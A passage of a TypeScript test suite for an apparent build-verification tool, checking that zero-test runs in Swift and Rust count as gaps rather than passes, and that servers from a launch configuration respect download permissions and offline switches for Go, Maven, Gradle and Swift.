    const r = await check(GO, {
      after: { "go.mod": GO_MOD + "\nrequire example.com/other v1.0.0\n" }, approvals: memoryApprovals(), check: { install: "ask" } as never,
      askScripts: async () => true, askInstall: async () => true, run: (c) => (c.includes("GOPROXY=off") && c.includes("go build") ? failing(NEEDS_NET) : res()),
    });
    expect(r.commands.some((c) => !c.includes("GOPROXY=off"))).toBe(true);
  });
});

describe("a test run that ran no tests is not a pass", () => {
  test("Swift: 'Executed 0 tests' is a gap, not 'The tests passed'", async () => {
    const files = { "Package.swift": "// swift-tools-version:5.9\n", "Tests/xTests/A.swift": "import XCTest\nfinal class A: XCTestCase { func testA() {} }\n" };
    const zero = await check(files, { run: (c) => (c.startsWith("swift test") ? res({ stdout: "Test Suite 'All tests' passed at 2026-10-21.\n\t Executed 0 tests, with 0 failures (0 unexpected) in 0.001 (0.002) seconds\n" }) : res()) });
    expect(zero.result.steps.find((x) => x.rung === "tests")?.status).toBe("skipped");
    expect(zero.result.verdict).toBe("passed_with_gaps");
    expect(zero.result.gaps?.join(" ")).toMatch(/no tests/i);
    const some = await check(files, { run: (c) => (c.startsWith("swift test") ? res({ stdout: "\t Executed 3 tests, with 0 failures (0 unexpected) in 0.1 (0.1) seconds\n" }) : res()) });
    expect(some.result.steps.find((x) => x.rung === "tests")?.status).toBe("passed");
  });
  test("Xcode's own wording, and Swift Testing's, count the same", async () => {
    const files = { "Package.swift": "// swift-tools-version:5.9\n", "Tests/xTests/A.swift": "import Testing\n" };
    const out = "Test run with 0 tests in 0 suites passed after 0.001 seconds.\n";
    const r = await check(files, { run: (c) => (c.startsWith("swift test") ? res({ stdout: out }) : res()) });
    expect(r.result.steps.find((x) => x.rung === "tests")?.status).toBe("skipped");
    // XCTest ran 2 tests while Swift Testing found none: that is a pass.
    const mixed = await check(files, { run: (c) => (c.startsWith("swift test") ? res({ stdout: "\t Executed 2 tests, with 0 failures\n" + out }) : res()) });
    expect(mixed.result.steps.find((x) => x.rung === "tests")?.status).toBe("passed");
  });
  test("Rust: every 'running 0 tests' is a gap, one 'running 2 tests' is a pass", async () => {
    const files = { "Cargo.toml": '[package]\nname = "x"\nversion = "0.1.0"\n', "src/lib.rs": "#[test]\nfn a() {}\n" };
    const zero = await check(files, { run: (c) => (c.includes("cargo test") ? res({ stdout: "running 0 tests\n\ntest result: ok. 0 passed\n" }) : res()) });
    expect(zero.result.steps.find((x) => x.rung === "tests")?.status).toBe("skipped");
    const some = await check(files, { run: (c) => (c.includes("cargo test") ? res({ stdout: "running 2 tests\ntest a ... ok\n\nrunning 0 tests\n" }) : res()) });
    expect(some.result.steps.find((x) => x.rung === "tests")?.status).toBe("passed");
  });
});

describe("a server named in .claude/launch.json follows the same download rules as a build", () => {
  const launch = (exe: string, args: string[]) => ({ ".claude/launch.json": JSON.stringify({ configurations: [{ runtimeExecutable: exe, runtimeArgs: args, port: 8080 }] }) });
  const WRAP = { "build.gradle": "plugins { id 'java' }\n", gradlew: "#!/bin/sh\n", "gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https\\://services.gradle.org/distributions/gradle-8.5-bin.zip\n" };
  const serverSpy = (seen: string[]) => (async (start: { command: string }) => { seen.push(start.command); return { ok: true, url: "http://127.0.0.1:9/", port: 9, stop: async () => {} }; }) as never;
  test("a gradlew whose Gradle is not on this Mac would download it first: not started when downloads are not allowed, and said as a gap", async () => {
    const seen: string[] = [];
    const env: NativeEnv = { has: (t) => t === "java", home: tmp() };
    const r = await check({ ...WRAP, ...launch("./gradlew", ["bootRun"]) }, { env, check: { install: "never" } as never, server: serverSpy(seen) });
    expect(seen).toEqual([]);
    expect(r.result.verdict).not.toBe("failed");
    expect(r.result.gaps?.join(" ")).toMatch(/download/);
  });
  test("a wrapper start with 'ask' asks once, and a no keeps the server down", async () => {
    const seen: string[] = [];
    const env: NativeEnv = { has: (t) => t === "java", home: tmp() };
    const r = await check({ ...WRAP, ...launch("./gradlew", ["bootRun"]) }, { env, check: { install: "ask" } as never, server: serverSpy(seen) });
    expect(seen).toEqual([]);
    expect(r.asks.filter((a) => a.startsWith(DOWNLOAD_ASK))).toHaveLength(1);
  });
  test("a cached wrapper or a Maven on this Mac is started with its offline switch", async () => {
    const seen: string[] = [];
    await check({ "pom.xml": POM, ...launch("mvn", ["spring-boot:run"]) }, { check: { install: "never" } as never, server: serverSpy(seen) });
    expect(seen).toEqual(["mvn -o spring-boot:run"]);
    const gseen: string[] = [];
    await check({ "build.gradle": "plugins { id 'java' }\n", ...launch("gradle", ["bootRun"]) }, { check: { install: "never" } as never, server: serverSpy(gseen) });
    expect(gseen).toEqual(["gradle --offline bootRun"]);
  });
  test("swift run and xcodebuild have no offline switch: a project with remote packages is not started when downloads are not allowed", async () => {
    const seen: string[] = [];
    const pkg = 'let p = Package(name: "x", dependencies: [.package(url: "https://github.com/vapor/vapor.git", from: "4.0.0")])\n';
    const r = await check({ "Package.swift": pkg, ...launch("swift", ["run"]) }, { check: { install: "never" } as never, server: serverSpy(seen) });
    expect(seen).toEqual([]);
    expect(r.result.verdict).not.toBe("failed");
    expect(r.result.gaps?.join(" ")).toMatch(/download/);
    // With no packages to fetch there is nothing to hold back.
    const none: string[] = [];
    await check({ "Package.swift": "// swift-tools-version:5.9\n", ...launch("swift", ["run"]) }, { check: { install: "never" } as never, server: serverSpy(none) });
    expect(none).toEqual(["swift run"]);
  });
  test("with downloads allowed, the wrapper is started as written", async () => {
    const seen: string[] = [];
    const env: NativeEnv = { has: (t) => t === "java", home: tmp() };
    await check({ ...WRAP, ...launch("./gradlew", ["bootRun"]) }, { env, server: serverSpy(seen) });
    expect(seen).toEqual(["./gradlew bootRun"]);
  });
});
